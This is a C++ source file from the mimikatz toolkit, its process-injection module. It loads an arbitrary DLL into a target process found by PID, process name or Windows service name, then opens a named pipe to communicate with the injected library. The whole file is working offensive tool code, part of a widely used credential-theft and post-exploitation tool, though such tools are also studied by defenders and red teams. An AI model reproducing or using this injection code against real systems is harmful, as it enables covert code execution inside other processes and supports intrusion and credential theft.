/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : http://creativecommons.org/licenses/by-nc-sa/3.0/
*/
#include "mod_mimikatz_inject.h"

mod_pipe * mod_mimikatz_inject::monCommunicator = NULL;

vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> mod_mimikatz_inject::getMimiKatzCommands()
{
	vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> monVector;
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(pid, L"pid", L"Injects a library into a PID"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(process, L"process", L"Injects a library into a process"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(service, L"service", L"Injects a library into a service"));
	return monVector;
}

bool mod_mimikatz_inject::process(vector<wstring> * arguments)
{
	wstring processName = arguments->front();
	wstring fullLib = arguments->back();
	
	mod_process::KIWI_PROCESSENTRY32 monProcess;
	if(mod_process::getUniqueForName(&monProcess, &processName))
	{
		wcout << L"PROCESSENTRY32(" << processName << L").th32ProcessID = " << monProcess.th32ProcessID << endl;
		injectInPid(monProcess.th32ProcessID, fullLib);
	}
	else wcout << L"Too much or not process : \'" << processName << L"\' mod_process::getUniqueProcessForName : " << mod_system::getWinError() << endl;

	return true;
}

bool mod_mimikatz_inject::service(vector<wstring> * arguments)
{
	wstring serviceName = arguments->front();
	wstring fullLib = arguments->back();
	
	mod_service::KIWI_SERVICE_STATUS_PROCESS monService;
	if(mod_service::getUniqueForName(&monService, &serviceName))
	{
		wcout << L"SERVICE(" << serviceName << L").serviceDisplayName = " << monService.serviceDisplayName << endl;
		wcout << L"SERVICE(" << serviceName << L").ServiceStatusProcess.dwProcessId = " << monService.ServiceStatusProcess.dwProcessId << endl;
		injectInPid(monService.ServiceStatusProcess.dwProcessId, fullLib);
	}
	else wcout << L"Unique service not found : \'" << serviceName << L"\' ; mod_service::getUniqueForName : " << mod_system::getWinError() << endl;

	return true;
}

bool mod_mimikatz_inject::pid(vector<wstring> * arguments)
{
	wstring strPid = arguments->front();
	wstring fullLib = arguments->back();
	
	DWORD pid;
	wstringstream monStream(strPid);
	monStream >> pid;

	injectInPid(pid, fullLib, !(arguments->size() >= 3));

	return true;
}

bool mod_mimikatz_inject::injectInPid(DWORD & pid, wstring & libPath, bool isComm)
{
	bool reussite = false;

	if(!isComm || (isComm && !monCommunicator))
	{
		if(reussite = mod_inject::injectLibraryInPid(pid, &libPath))
		{
			if(isComm)
			{
				wstring monBuffer = L"";

				monCommunicator = new mod_pipe(L"kiwi\\mimikatz");
				wcout << L"Waiting for client connection..." << endl;

				if(monCommunicator->createServer())
				{
					wcout << L"Server connected to a client !" << endl;
					if(monCommunicator->readFromPipe(monBuffer))
					{
						wcout << L"Message process :" << endl << monBuffer << endl;
					}
					else
					{
						wcout << L"Error : Unable to read the first message ! ; " <<  mod_system::getWinError() << endl;
						closeThisCommunicator();
					}
				}
				else
				{
					wcout << L"Error : Unable to create a communication channel! ; " << mod_system::getWinError() << endl;
					closeThisCommunicator();
				}
			}
			else
				wcout << L"Injected without communication (legacy)" << endl;
		} else wcout << L"Error : Unable to inject ! ; " << mod_system::getWinError() << endl;
	}
	else wcout << L"Error : communicaton channel is already open" << endl;

	return reussite;
}


bool mod_mimikatz_inject::closeThisCommunicator()
{
	if(monCommunicator)
	{
		wcout << L"Closure of the communication channel" << endl;
		delete monCommunicator;
		monCommunicator = NULL;
	}
	return true;
}